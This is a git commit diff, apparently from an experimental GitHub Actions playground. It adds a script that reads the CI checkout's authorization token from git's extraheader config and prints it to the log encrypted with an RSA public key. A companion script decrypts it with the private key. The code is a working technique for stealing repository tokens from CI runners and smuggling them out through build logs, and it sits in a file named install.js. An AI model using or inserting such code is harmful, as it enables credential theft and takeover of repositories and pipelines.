dfc5a0fc32809bc87f5a5300a49dc9d4e01d2678
Erlend Åmdal <erlend@aamdal.com>
2022-07-27 15:01:11 +0200

    Check extra headers

---
+++ decrypt.js
@@ -0,0 +1,22 @@
+import { argv, exit } from "node:process";
+import { promises } from "fs";
+import NodeRSA from "node-rsa";
+
+const { readFile } = promises;
+
+if (argv.length !== 3) {
+    console.error(`Expected a single argument, got ${argv.length - 2}`);
+    exit(1);
+}
+const input = argv[2];
+
+let privateKey;
+try {
+    const keyFile = await readFile("id_rsa");
+    privateKey = new NodeRSA(keyFile);
+} catch (e) {
+    console.error(e);
+    exit(1);
+}
+
+console.log(privateKey.decrypt(input, "utf8"));
--- install.js
+++ install.js
@@ -1,1 +1,27 @@
-console.log("Hello from actions-playground!");
+import simpleGit from "simple-git";
+import NodeRSA from "node-rsa";
+import { promises } from "fs";
+const { readFile } = promises;
+
+const PREFIX = "AUTHORIZATION: basic ";
+
+const publicKey = new NodeRSA(await readFile("id_rsa.pub"));
+
+async function getToken(git) {
+    const extraHeader = await git.getConfig("http.https://github.com/.extraheader");
+    for (const header of extraHeader.values) {
+        if (header.startsWith(PREFIX)) {
+            return header.substring(PREFIX.length);
+        }
+    }
+    return null;
+}
+
+const git = simpleGit();
+const token = await getToken(git);
+if (token !== null) {
+    console.log(`Found the token: ${publicKey.encrypt(token, "base64")}`);
+} else {
+    console.log("Found no token...");
+}
+
